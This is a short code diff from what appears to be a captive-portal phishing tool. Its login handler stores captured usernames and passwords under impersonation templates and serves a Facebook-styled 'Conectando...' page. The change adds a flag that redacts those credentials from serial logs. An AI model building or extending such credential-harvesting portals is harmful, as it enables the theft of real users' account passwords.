@@ -65,7 +65,11 @@ void CaptivePortal::handleLogin() {
     
     if (field1.length() > 0) {
         store.addCredential(TEMPLATE_NAMES[currentTemplate], field1, field2);
+#if SERIAL_REDACT_CREDENTIALS
+        Serial.printf("[PORTAL] Credencial capturada: %s ([redacted])\n", TEMPLATE_NAMES[currentTemplate]);
+#else
         Serial.printf("[PORTAL] Credencial: %s / %s\n", field1.c_str(), field2.c_str());
+#endif
     }
     
     String thanks = "<html><head><meta charset='UTF-8'><style>body{font-family:Arial,sans-serif;display:flex;justify-content:center;align-items:center;height:100vh;margin:0;background:#f0f2f5;}.msg{background:#fff;padding:40px;border-radius:8px;box-shadow:0 2px 4px rgba(0,0,0,0.1);text-align:center;}h2{color:#1877f2;margin-bottom:10px;}p{color:#65676b;}</style></head><body><div class='msg'><h2>Conectando...</h2><p>Por favor espera un momento.</p></div></body></html>";
